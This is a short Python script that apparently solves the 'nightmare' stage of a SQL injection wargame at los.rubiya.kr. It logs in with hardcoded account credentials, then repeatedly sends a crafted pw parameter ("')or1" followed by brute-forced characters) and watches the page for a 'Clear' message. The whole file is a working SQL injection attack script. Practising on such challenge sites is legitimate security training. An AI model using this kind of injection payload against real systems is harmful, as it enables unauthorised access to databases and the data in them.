from bs4 import BeautifulSoup
import requests

def login(id, pw):
    url = 'https://los.rubiya.kr/?login'
    data = {'id': id, 'pw': pw}
    res = requests.post(url, data=data)

    if res.status_code != 200:
        print('Please check server status.')
        exit(1)
    if res.text.find('fail') != -1:
        print('Please check your id or pw')
        exit(1)

    print('Login Success!')
    return res.cookies.get_dict()


cookie = login('d0rk','d0rkd0rk')

url = 'https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php?pw=%27)or1'
while True:
    for i in range(32, 128):
        res = requests.get(url + chr(i), cookies=cookie)
        soup = BeautifulSoup(res.text, 'html.parser')
        print(res.text)
        h2s = soup.find_all('h2')
        if h2s:
            for h2 in h2s:
                if h2.text.find('Clear') != -1:
                    print('Clear This Stage! ')
                    exit(0)


